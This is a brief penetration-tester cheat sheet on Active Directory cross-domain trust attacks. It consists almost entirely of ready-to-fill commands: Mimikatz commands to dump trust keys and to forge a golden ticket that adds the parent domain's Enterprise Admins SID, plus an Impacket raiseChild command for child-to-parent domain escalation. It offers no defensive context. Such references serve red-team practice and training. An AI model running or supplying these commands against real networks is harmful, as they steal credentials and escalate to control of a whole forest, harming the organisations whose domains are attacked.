# Trust Attacks

## Cross-Domain Attacks

### Mimikatz Get Trust Key (Windows)
    mimikatz# lsadump::trust /patch

### Mimikatz Inter-Realm TGT (Windows)
    mimikatz# kerberos::golden /user:<TARGET_USER> /domain:<CHILD_DOMAIN> /sid:<CHILD_DOMAIN_SID> /krbtgt:<KRBTGT_HASH> /sids:<PARENT_DOMAIN_SID>-519 /ptt

### Impacket raiseChild
    impacket-raiseChild <DOMAIN>/<USER>:<PASSWORD> -target-exec <DC_IP>
